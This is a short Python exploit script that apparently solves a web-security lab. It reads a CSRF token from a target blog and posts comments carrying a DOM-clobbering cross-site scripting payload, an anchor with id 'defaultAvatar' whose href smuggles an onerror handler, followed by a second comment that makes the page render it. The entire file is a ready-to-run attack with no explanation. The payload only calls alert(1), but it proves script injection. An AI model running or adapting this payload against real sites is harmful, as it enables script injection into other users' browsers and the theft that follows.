import requests, sys
from bs4 import BeautifulSoup

site = sys.argv[1]
if'https://' in site:
    site = site.rstrip('/').lstrip('https://')

url = f'https://{site}'

s = requests.Session()
r = s.get(url)
soup = BeautifulSoup(r.text, 'html.parser')
csrf = soup.find("input")['value']

comment_data = f'<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">'

post_data = {

    'csrf' : csrf,
    'postId' : '10',
    'Comment' : comment_data,
    'Name' : 'Hacker',
    'Email' : 'abc@gmail.com',
    'Website' : '',
    'formAction' : 'submit',
}
resp = s.post(url+'/post/comment', data=post_data)

post_data_2 = {
  'csrf' : csrf,
  'postId' : '10',
  'Comment' : 'hacked',
  'Name' : 'Hacker',
  'Email' : 'abc@gmail.com',
  'Website' : '',
  'formAction' : 'submit',
}

resp = s.post(url+'/post/comment', data=post_data_2)
x = s.get(url+'/post/comment')
